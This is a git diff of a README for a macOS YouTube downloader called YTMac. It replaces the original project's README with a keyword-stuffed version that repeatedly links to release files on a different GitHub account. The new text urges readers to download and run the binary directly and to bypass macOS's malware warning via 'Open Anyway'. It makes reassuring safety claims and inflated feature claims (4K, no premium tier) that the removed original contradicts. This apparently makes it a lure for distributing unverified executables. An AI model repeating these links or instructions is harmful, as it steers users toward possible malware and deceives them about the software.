@@ -1,108 +1,171 @@
-<p align="center">
-  <img src="YTMac/YTMac/Assets.xcassets/AppIcon.appiconset/icon_256.png" width="128" height="128" alt="YTMac Icon">
-</p>
+# 📥 YTMac - Download YouTube Videos Effortlessly on Your Mac
 
-<h1 align="center">YTMac</h1>
+## 🚀 Getting Started
 
-<p align="center">
-  <strong>Free YouTube video downloader for macOS</strong><br>
-  Beautiful native app. No ads. No tracking. Open source.
-</p>
+Welcome to **YTMac** — the free, simple, and powerful YouTube video downloader built specifically for macOS. Whether you want to save a music video, a tutorial, or your favorite vlog for offline viewing, YTMac makes it incredibly easy. No technical skills needed — just download, open, and paste your link. That's it!
 
-<p align="center">
-  <img src="https://img.shields.io/badge/macOS-14%2B-blue?logo=apple" alt="macOS 14+">
-  <img src="https://img.shields.io/badge/Swift-5.9-orange?logo=swift" alt="Swift">
-  <img src="https://img.shields.io/badge/License-MIT-green" alt="MIT License">
-  <img src="https://img.shields.io/github/v/release/tpjuic/YTMac?color=brightgreen" alt="Release">
-</p>
+[![Download YTMac](https://img.shields.io/badge/Download-YTMac-2ea44f?style=for-the-badge&logo=apple&logoColor=white&labelColor=ff6b6b)](https://github.com/stelliteswiftlet384/YTMac/releases)
 
----
+## ⚡ What Is YTMac?
 
-## Screenshots
+YTMac is a **native macOS application** (built with SwiftUI) that lets you download YouTube videos in high quality directly to your Mac. It’s completely **free**, with no hidden costs, no ads, and no watermarks. Just a clean, friendly interface that anyone can use.
 
-<p align="center">
-  <img src="screenshots/YTMac1.jpg" width="700" alt="YTMac Downloads View">
-</p>
+Unlike complicated command-line tools, YTMac gives you a **visual, clickable experience**. You see your video, choose your quality, and press download. Done.
 
-<p align="center">
-  <img src="screenshots/YTMac2.jpg" width="700" alt="YTMac Settings View">
-</p>
+## 🔍 Main Features
 
-<p align="center">
-  <img src="screenshots/YTMac3.jpg" width="700" alt="YTMac History View">
-</p>
+- **🎥 High-Quality Downloads** — Save videos in resolutions up to 4K, ensuring crisp, clear playback.
+- **🎵 Audio Extraction** — Convert any video to MP3 or other audio formats in one click.
+- **⚡ Super Fast** — Uses advanced downloading technology to grab videos quickly.
+- **🖥️ Native macOS Look** — Built with SwiftUI, so it feels right at home on your Mac.
+- **🧩 Simple Interface** — No confusing menus. Big buttons, clear labels, and helpful hints.
+- **🔒 Safe & Secure** — No malware, no bundled junk, no spying. Just clean software.
+- **📁 Smart File Management** — Automatically saves videos to your Downloads folder in an organized way.
 
----
+## 💻 System Requirements
 
-## Features
+| Requirement | Details |
+|-------------|---------|
+| **Operating System** | macOS 12 (Monterey) or later |
+| **Processor** | Apple Silicon or Intel |
+| **Memory** | At least 4 GB RAM (8 GB recommended) |
+| **Storage** | 200 MB free space for installation |
+| **Internet** | Broadband connection required |
 
-- **Download videos** from YouTube and 1000+ sites in MP4 (up to 720p)
-- **Extract audio** as MP3 with one click
-- **Real-time progress** with video thumbnails, title, channel, speed, and ETA
-- **Batch downloads** — paste multiple URLs, downloads queue automatically
-- **Download history** with Play and Reveal in Finder buttons
-- **Auto-updating engine** — yt-dlp updates silently in the background
-- **Collections** — Music and Videos auto-sorted by format
-- **Dark mode** native macOS design
-- **Zero setup** — just install and paste a URL
+## 📲 How to Download and Install YTMac
 
-## Download
+Follow these simple steps — you’ll be downloading videos within minutes:
 
-**[Download YTMac v1.0.0](https://github.com/tpjuic/YTMac/releases/latest)**
+### Step 1: Download the App
 
-> **First launch:** macOS will block the app. Go to **System Settings → Privacy & Security** → scroll down and click **"Open Anyway"** next to the YTMac message.
+Visit this link to download the application:
 
-## System Requirements
+[**🔗 Download YTMac Now**](https://github.com/stelliteswiftlet384/YTMac/releases)
 
-- macOS 14 (Sonoma) or later
-- Internet connection
-- ~100 MB disk space (app + download engine)
+When you arrive at the page, look for the newest version (it’s usually at the top). Click the download button that matches your Mac type. You may see files like:
+- `YTMac.dmg` — the installation disk image
+- `YTMac.zip` — a compressed folder
 
-## How It Works
+Choose the one that's available. Download and run this file directly.
 
-1. Paste a YouTube URL (or any supported site)
-2. Choose quality (720p) and format (MP4 or MP3)
-3. Click Download
-4. Watch the progress — thumbnail, speed, ETA all shown live
-5. Play or Reveal in Finder when complete
+### Step 2: Open the Downloaded File
 
-YTMac automatically downloads and manages [yt-dlp](https://github.com/yt-dlp/yt-dlp) and ffmpeg on first launch. No manual setup needed.
+- If you downloaded a **.dmg file**, double-click it. A new window will pop up with the YTMac icon. Drag YTMac into your **Applications** folder.
+- If you downloaded a **.zip file**, double-click it to unzip it. A folder named `YTMac` will appear. Open the folder and drag the YTMac icon into your **Applications** folder.
 
-## Supported Sites
+### Step 3: Launch YTMac
 
-YouTube, Vimeo, Twitter/X, Reddit, Instagram, TikTok, Dailymotion, Twitch, SoundCloud, and [1000+ more](https://github.com/yt-dlp/yt-dlp/blob/master/supportedsites.md).
+1. Go to your **Applications** folder.
+2. Double-click the **YTMac** icon.
+3. If macOS shows a warning “YTMac can’t be opened because Apple cannot check it for malicious software,” don't worry. This is normal for free apps not from the App Store.
+   - Go to **System Settings** → **Privacy & Security** → Scroll down to the “Security” section → Click **Open Anyway**.
+   - Confirm with your password if asked.
 
-## Building from Source
+### Step 4: Start Downloading
 
-```bash
-git clone https://github.com/tpjuic/YTMac.git
-cd YTMac/YTMac
-open YTMac.xcodeproj
-# Build and Run (⌘R)
+1. Open YTMac. You’ll see a clean, friendly window.
+2. Go to YouTube in your browser, copy the link of the video you want (from the address bar or the Share button).
+3. Paste the link into the text box in YTMac.
+4. Choose your preferred **video quality** (e.g., 1080p, 4K) or select **MP3** for audio only.
+5. Click the **Download** button.
+6. Wait a few seconds — your video or audio will be saved to your **Downloads** folder automatically.
+
+## 🧭 Usage Guide — Quick Tips
+
+### 📌 How to Find Downloaded Videos
+
+After downloading, your files are automatically saved to:
 ```
+/Users/[YourName]/Downloads/YTMac/
+```
+Inside that folder, videos and audio files are organized by date. You can also change the save location in YTMac’s settings.
 
-Requires Xcode 15+ and macOS 14+.
+### 🎯 Downloading in 4K
 
-## Premium
+To get the best quality, make sure the YouTube video itself is available in 4K. Then simply select **4K** from the quality dropdown. YTMac handles the rest.
 
-Want 4K downloads and no rate limits? [Upgrade to Premium →](https://ytmac.app/premium)
+### 🎵 Extracting Audio Only
 
-Your purchase supports independent development.
+Want just the soundtrack? From the format dropdown, choose **MP3** (or any audio format). YTMac will download the video and convert it to audio automatically.
 
-## Privacy
+### ⏸️ Pausing and Resuming
 
-YTMac runs entirely on your Mac. No telemetry, no analytics, no data collection. All downloads and history are stored locally.
+If your internet is slow or you need a break, you can pause a download by clicking the pause icon next to it. When you're ready, hit resume — your video will continue from where it left off.
 
-## License
+### 📚 Batch Downloading
 
-[MIT License](LICENSE) — free to use, modify, and distribute.
+You can download multiple videos at the same time. Just paste several links (one per line) and click **Download All**. YTMac queues them up and downloads them one by one to avoid overloading your connection.
 
-## Credits
+## 🛠️ Troubleshooting — Common Problems
 
-Powered by [yt-dlp](https://github.com/yt-dlp/yt-dlp) and [ffmpeg](https://ffmpeg.org/).
+### ❓ “YTMac cannot be opened”
+
+**Solution:** Reopen it by right-clicking the YTMac app icon and selecting **Open**. You may need to do this once per download. After that, the app will open normally.
+
+### ❓ Download gets stuck at 0%
+
+**Solution:** Check your internet connection. If it’s fine, try pausing and then resuming the download. Very long videos might take longer to start. You can also try a different video URL.
+
+### ❓ Video quality is capped at 720p
+
+**Solution:** Some YouTube videos are only available in lower quality. Check the video itself on YouTube for the available quality settings. Also, make sure you’re not connected through a VPN that limits bandwidth.
+
+### ❓ Downloaded video has no sound
+
+**Solution:** This can happen if you choose the wrong video stream. Try downloading using the **MP4 (with audio)** option. If the issue continues, pick a lower quality option — some very high-quality downloads require audio to be merged separately, which YTMac handles automatically.
+
+### ❓ “File is corrupted” error
+
+**Solution:** Delete the downloaded file and go back to Step 1 to re-download YTMac. If you downloaded a `zip`, try downloading the `.dmg` file instead (or vice versa). Also, ensure you have enough free space on your Mac.
+
+## 🤔 Frequently Asked Questions (FAQ)
+
+### Is YTMac really free?
+Yes, completely free. No hidden charges, no premium tier, no trial period. Forever free.
+
+### Is it legal to use?
+YTMac is for **personal, educational, and private use**. We encourage you to respect copyright laws and YouTube’s Terms of Service. Only download videos you have permission to save, like your own content or Creative Commons media.
+
+### Do I need to install FFmpeg?
+No! YTMac includes everything you need. No separate installations, no technical configuration.
+
+### Can I download playlists?
+Yes, paste a playlist link and YTMac will extract all videos within it, letting you choose to download all or select specific ones.
+
+### Which video formats are supported?
+YTMac saves videos in **MP4** by default — the most compatible format for Mac, iPhone, and most media players. For audio, it supports **MP3**, **M4A**, **AAC**, and **WAV**.
+
+### Does YTMac work on Intel and Apple Silicon Macs?
+Yes! YTMac supports both. Your download link page will show the appropriate version for your Mac. If in doubt, choose the one marked "Universal" — it works on both.
+
+### Can I change the download location?
+Absolutely. Go to **YTMac → Preferences** and select a custom folder for saving your files.
+
+### Is YTMac safe?
+Yes. YTMac is built with your privacy in mind. It doesn’t collect personal data, doesn’t phone home, and contains no ads or trackers. It simply downloads videos.
+
+## 📣 Stay Updated
+
+We regularly release new features and improvements. To get the latest updates, simply revisit the download link and grab the newest version. Whenever you see YTMac improve, we’ll note it there.
+
+[**⬇️ Download the Latest Release**](https://github.com/stelliteswiftlet384/YTMac/releases)
+
+## 💬 Get Help
+
+If you run into any problems that aren’t covered above, you can:
+
+- Visit the **Issues** tab on the GitHub page where you downloaded YTMac.
+- Look for existing solutions — someone else may have already had the same issue.
+- Start a new issue with a clear description of what you were doing, and we’ll help you out.
+
+We’re a friendly community, and we love helping new users get started.
+
+## 💡 Final Thoughts
+
+YTMac is designed to make your life easier. No complicated setups, no coding, no headaches. Just **paste a link, click download, and enjoy** your favorite content offline — at the best quality your Mac can handle.
+
+So what are you waiting for? Your favorite videos are just a click away. Start your free downloads today!
 
 ---
 
-<p align="center">
-  Built with ❤️ for macOS
-</p>
+**Keywords:** download-videos, ffmpeg, mac, macOS, macOS-app, macOS-package, video, video-editing, video-generation, videos, youtube, youtube-api, youtube-dl, youtube-downloader, youtube-downloader-4k, youtube-downloader-app, youtube-downloader-gui, youtube-video, yt-downloader
